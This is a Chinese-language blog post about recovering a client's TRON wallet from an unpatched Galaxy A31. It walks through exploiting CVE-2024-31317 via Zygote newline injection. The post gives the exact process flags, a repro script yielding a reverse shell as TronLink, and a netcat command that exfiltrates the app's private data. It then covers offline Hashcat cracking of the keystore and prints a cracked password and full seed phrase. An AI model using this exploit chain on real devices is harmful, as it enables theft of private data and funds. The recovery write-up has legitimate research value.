+++
title = "利用 Android exploit 和暴力破解恢复 TRON 钱包"
date = "2026-03-22T03:00:00-03:00"
readingTime = true
+++

有个客户找到我，这种问题其实遇到过很多次了：手机里有个 TRON 钱包，助记词早就不知道丢哪去了，app 的密码也忘了。钱还在那儿，区块链上看得到，但就是用不了。好在手机一直没丢也没清过数据。价钱谈好，我就开始研究能怎么搞。

![凉宫春日的忧郁的长门有希](nagato_yuuki.gif)

<!--more-->

这种活我第一步就是把所有信息都记下来，任何细节都可能是关键：

- 型号：Galaxy A31
- Android：12
- 最后一次更新：2024 年 1 月
- App：TronLink Pro
- 密码规则：最少 8 个字符，至少一个大写字母、一个小写字母和一个数字

我让客户把能想到的关于密码的一切都告诉我。单词、数字、符号、名字、昵称、家人、日期、规律，脑子里闪过什么就说什么。我打开 app 手动试了几个密码，试了没几次就被锁了 1 小时。

<img alt="TronLink Pro 创建钱包界面，展示密码要求" src="/en/blog/tronlink-wallet-recovery/utj3xfqnnr_ttx7n2vfop.png" style="max-width: min(280px, 100%)" />

这条路走下去肯定不行，所以整个工作分成两部分：

1. **在不搞坏任何东西的前提下，把加密的钱包从手机里弄出来**
2. **拿到电脑上离线 crack 密码**，绕开 UI 的速率限制

我这里讲的所有内容都在这个仓库里有复现：

<https://github.com/astrovm/2026-03-tronlink-wallet-recovery-reference>

## 第一阶段：从手机里提取钱包

TronLink 把所有敏感数据存在 app 的私有目录下：

```text
/data/data/com.tronlinkpro.wallet
```

只有 app 本身和 root 才能访问这个目录。而这台手机当然没有 root。root 也不是个选项，因为很多三星手机一解锁 bootloader 就全盘格式化了。

早年间 Android 厂商不让你解锁 bootloader，root 要靠各种版本特定的漏洞，所以那时候 root 不丢数据很正常。现在用的都是官方方法，默认就把数据擦掉了。

### 找一条不需要 root 的路

最合理的思路就是找已知的系统漏洞。这里运气不错：这台 Galaxy A31 的软件版本相当落后。Android 12，安全补丁停在 2024 年 1 月。也就是说有整整 2 年已经公开的漏洞从来没被修复过。接下来就是做这类活最好玩的部分了。

借助 Grok，我找到了 **CVE-2024-31317**，这是 `ZygoteProcess.java` 里的一个 bug，在 2024 年 6 月的补丁里修复了。这个 exploit 能让你以设备上**任何 app** 的身份执行代码。不需要 root，只需要 `adb`。像 Oxygen 这种取证软件也用的同一个 exploit，全世界的警察和情报机构都拿它来提取手机数据。

Galaxy A31 从来没收到过这个补丁，所以完全可以利用。太好了，我开始研究它是怎么工作的。

![看见 Matrix](matrix.gif)

### Exploit 的原理

要理解这个 bug 得先绕个弯。Android 里有个全局 setting 叫 `hidden_api_blacklist_exemptions`（在 `Settings.Global` 里）。Google 用它来指定哪些系统 app 可以不受限制地使用内部隐藏 API。通过 `adb shell` 就能写这个 setting，因为 adb 的上下文自带 `WRITE_SECURE_SETTINGS` 权限。

那谁来读这个 setting 呢？**Zygote**。Zygote 是 Android userland 里的特权进程，负责启动所有 app。它不是每次从零创建 app，而是预加载好 runtime，然后 fork 自己，子进程变成你需要的 app。它卡在 kernel 和 app 之间，位置非常敏感。

Bug 就出在 Zygote 接收 `hidden_api_blacklist_exemptions` 的值时**没有过滤换行符**。如果你在 setting 的值里塞进 `\n`，就能在 Zygote 的协议里注入完整的命令。而 Zygote 能切换自己的 UID，接受 `--setuid`、`--setgid`、`--app-data-dir`、`--package-name` 这些命令... 也就是说你可以告诉它"给我起一个**就是** TronLink 的进程"。它就照做了。出来的进程拥有这个 app 的完整身份，可以访问它所有的私有文件。

但光写 setting 还不够。Zygote 不会主动重新读取。你得强制让 Android 的 Settings app 重启（`am force-stop com.android.settings` 然后 `am start`）。Settings 启动时会通过 socket 把全局 settings 重新发给 Zygote，这时候 Zygote 才会解析被修改过的值，执行注入的命令。

更麻烦的是，Android 12+ 里 Google 加了 `NativeCommandBuffer`，一个会丢弃多余字节的 buffer。如果直接发 payload，buffer 会满然后把内容全丢掉。解决办法是先发大约 8192 字节的 padding 强制 flush，让真正的参数在单独的一次写入中到达。

要让这个 exploit 生效，你需要 Android 9-14 且没打 2024 年 6 月的补丁，加上 `adb shell`（默认就有 `WRITE_SECURE_SETTINGS` 权限）。说个重要的事：如果你改了 setting 没清理就重启手机，会进入 **boot loop**。所以用完之后一定要清理，必须的。

这两个 repo 帮我省了不少功夫：

- <https://github.com/agg23/cve-2024-31317>
- <https://github.com/Anonymous941/zygote-injection-toolkit>

### 先在模拟器上测试

动真机之前我先起了个模拟器来模拟同样的环境。

<img alt="Android 12 (API 31) 模拟器，主屏幕已就绪等待测试" src="/en/blog/tronlink-wallet-recovery/v04-fjag_lnomy9qjva_b.png" style="max-width: min(280px, 100%)" />

装上同一版本的 TronLink，生成一个测试钱包，然后开始复现整个 exploit。

确认模拟器在 `adb` 里可见：

```bash
$ adb devices
```


```text
List of devices attached
emulator-5554   device
```

获取 TronLink 的 UID：

```bash
$ adb shell pm dump com.tronlinkpro.wallet | grep userId
```


```text
    userId=10145
```

借助 Gemini 对 `zygote-injection-toolkit` 做了一些修改，修了几个 bug 并适配这个场景。Payload 需要精确的 flags 让 Zygote 以 TronLink 的身份启动一个进程：

- `--setuid` 和 `--setgid` 设为 app 的 UID
- `--setgroups=3003`（inet，进程需要用 socket 就得有这个）
- `--app-data-dir=/data/user/0/com.tronlinkpro.wallet`
- `--package-name=com.tronlinkpro.wallet`
- `--target-sdk-version=30`
- `--is-top-app`
- `--seinfo=default:targetSdkVersion=30:complete`


这些全写进 `repro.py`。它组装带 Android 12+ padding 的 payload，通过 `adb shell` 注入，强制重启 Settings 来触发读取，然后等 localhost 上的 netcat 起来。如果成功了，你就得到了一个拥有 TronLink 身份的 reverse shell。如果失败了，它会清理 setting 以免手机变砖。

```bash
$ uv run repro.py --uid 10145 --gid 10145
```


```text
Injecting payload for UID 10145 and package com.tronlinkpro.wallet...
Injection sent. Waiting for listener...
Listener is UP!
```

`Listener is UP!`。成了。确认可以进去了。接下来就是在真机上操作，容不得出错。

### 提取完整 dump

在真机上复现。同样的步骤，同样的脚本，跑起来了。我进去了。

不逐个文件搞了，直接打包压缩通过 `netcat` 传到电脑上：

```bash
$ printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 127.0.0.1 1234 | base64 -d > recovery.tar.gz
```

![文件传输](file_transfer.gif)

这样就把完整的 app data 拿到了：`shared_prefs`、`databases`，等等。第一阶段完成。客户的手机一点没动，没 root，没解锁 bootloader，什么都没动。而我电脑上已经有了所需的一切。

## 第二阶段：离线破解密码

现在就看前面这些是不是全TM白忙活了。我开始分析 dump，关键文件是这个：

```text
recovery/shared_prefs/carlitosmenem991.xml
```

里面有所有东西：

- `wallet_name_key`：`carlitosmenem991`
- `wallet_address_key`：`TFbkzYHUvCVuybLKRQuDQmpNYw3HaViyvd`
- `wallet_keystore_key`：加密的 keystore（用密码保护的私钥）
- `wallet_newmnemonic_key`：加密的助记词（同样用密码保护）

和 dump 里其他 XML 交叉对比，确认是正确的钱包：

- `f_TronKey.xml` 里，`selected_wallet_key` 指向 `carlitosmenem991`
- `f_Tron_3.8.0.xml` 里，`key_recently_wallet` 也列出了 `carlitosmenem991`

### 加密方式

TronLink 用的是跟以太坊钱包一样的方案（V3 keystore）。密码先经过 **scrypt**（n=16384, r=8, p=1，故意设计得又慢又吃内存），输出 32 字节：前 16 字节用 **AES-128-CTR** 加密私钥，后 16 字节生成一个 **MAC**（keccak256），保存在 keystore 里。

想验证一个密码：跑 scrypt，算 MAC，跟存的那个对比一下就知道了。问题在于 scrypt 本身就是设计成很重的：好一点的 GPU 也就每秒几千次尝试，不是像 MD5 那样几十亿次。所以选择试哪些密码非常重要。

### 提取 hash 给 Hashcat

我写了 `tools/extract_hash.py`，读取 XML，提取 keystore 的 JSON 并转成 Hashcat 能识别的格式（mode 15700，Ethereum wallet）：

```bash
$ uv run tools/extract_hash.py recovery/shared_prefs/carlitosmenem991.xml > target.hash
$ cat target.hash
```


```text
$ethereum$s*16384*8*1*2ef2a618edbf5185c6e7062a39d5dcdb81ba683dc2f8ca01ce8ed8c5959bb12c*cc8bab0bc8701e9af687a4b4b6b527f962de582efb029b507fc90cfc393ecfd5*ffcf36eb0aaee16f676049a12307e247a868133dbd1d8c956cee6682f54b0704
```

在用真实数据之前，我先用模拟器里的测试钱包把整个流程跑了一遍。完全没问题，然后换成客户的数据。

### 攻击人类的模式

有 scrypt 挡着，纯 brute force 不现实。遍历所有可能的组合真的要花好几年。好在人不会随机生成密码：都是用名字、日期、昵称这种对自己有意义的东西。所以我把客户告诉我的所有信息和从 XML 里提取到的东西结合起来。

从客户那里拿到了名字、昵称和家人的姓氏：carlos、carlitos、turco、zulemita、menem、saul。可能有意义的数字：7、91、991、1991。常用符号：#、.、!、@。从 dump 里已经知道钱包名是 `carlitosmenem991`。

借助 Codex 搞了一个 Python 框架 `smart_recovery/`，把这些种子词输入进去，按从最可能到最不可能的顺序生成 wordlist。同时会过滤掉所有不满足钱包密码规则（8 个字符以上、大写、小写、数字）的组合，免得在根本不可能的组合上浪费时间。

思路是按优先级生成模式族，先把最可能的跑完，再往下走到 brute force。部分模式族：

| 模式族 | 模式 | 示例 |
|---|---|---|
| `compose.name-number` | 名字 + 数字 | `Carlitos7`、`Turco1991`、`Zulemita91` |
| `compose.name-extension-number` | 名字 + 姓氏 + 数字 | `CarlitosMenem7`、`Turcosaul991`、`Carlossaul91` |
| `compose.name-number-symbol` | 名字 + 数字 + 符号 | `Carlitos7!`、`Turco1991#`、`Zulemita7@` |
| `mutate.toggle-case-*` | 以上组合的所有大小写变体 | `tURCOSAUL7`、`tuRcosaul7`、`CARLITOS7!` |

每个族都会生成大小写变体（`carlitosmenem`、`CarlitosMenem`、`Carlitosmenem`）、顺序变体（`Turco7`、`7Turco`）和可选的符号变体（`Turcosaul7`、`Turcosaul7!`、`Turcosaul!7`）。`mutate.*` 族更进一步，用 hashcat 的规则直接在 GPU 上遍历所有大小写组合，不用展开 wordlist。框架会在多次运行间保存状态，不重复已做的工作。

跑起来扔给 Hashcat，然后去睡觉了。

```bash
uv run -m smart_recovery run --hash-file target.hash --seed-file note_seeds.json --recovery-root recovery
```

<img alt="Hashcat 以 Ethereum Wallet SCRYPT 模式运行，显示攻击进度" src="/en/blog/tronlink-wallet-recovery/qzcle-ah0fwm-svkgj1mj.png" style="max-width: min(480px, 100%)" />

前前后后跑了差不多 30 个小时，验证、测试、各种跑法试了个遍... CRACKED。

<img alt="Hashcat 显示 Cracked 状态，成功找到正确密码" src="/en/blog/tronlink-wallet-recovery/wylrwidwumnnrpsmqpcxr.png" style="max-width: min(480px, 100%)" />


```text
$ethereum$s*16384*8*1*2ef2a618edbf5185c6e7062a39d5dcdb81ba683dc2f8ca01ce8ed8c5959bb12c*cc8bab0bc8701e9af687a4b4b6b527f962de582efb029b507fc90cfc393ecfd5*ffcf36eb0aaee16f676049a12307e247a868133dbd1d8c956cee6682f54b0704:Turcosaul7
```

昵称 + 第二个姓 + 数字。"Turco" + "saul" + "7" = `Turcosaul7`。

## 第三阶段：恢复助记词并取回资金

密码拿到手，剩下的就是走个流程。同一个密码同时保护 keystore 和 mnemonic，所以有了密码就什么都有了。


我写了 `tools/decrypt_mnemonic.py`，读取 XML 里加密的 mnemonic，用密码解密，seed phrase 就出来了。

```bash
$ uv run tools/decrypt_mnemonic.py recovery/shared_prefs/carlitosmenem991.xml Turcosaul7
```


```text
stock dirt cat upset chat giraffe page blade face slush volcano dawn
```

把钱包导入到另一台设备，提走资金。

---

最后所有事情能成是因为一连串巧合都对上了：手机这么多年居然没出问题，Android 没打补丁，exploit 没搞坏任何东西，密码符合可预测的人类模式，客户记得足够多的线索把搜索空间缩到了可行的范围。

如果其中任何一个环节不一样，这笔钱就永远锁在那里了。各位，助记词一定要保管好，下次可不一定有个 CVE 能救你。

## 参考

- [Android 安全公告 2024年6月](https://source.android.com/docs/security/bulletin/2024-06-01)
- [CVE-2024-31317 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)
- [AOSP 补丁](https://android.googlesource.com/platform/frameworks/base/+/e25a0e394bbfd6143a557e1019bb7ad992d11985)
- [GitHub 上关于 CVE-2024-31317 的整理](https://github.com/agg23/cve-2024-31317)
- [Zygote Injection Toolkit](https://github.com/Anonymous941/zygote-injection-toolkit)
- [本案例的代码仓库和示例](https://github.com/astrovm/2026-03-tronlink-wallet-recovery-reference)
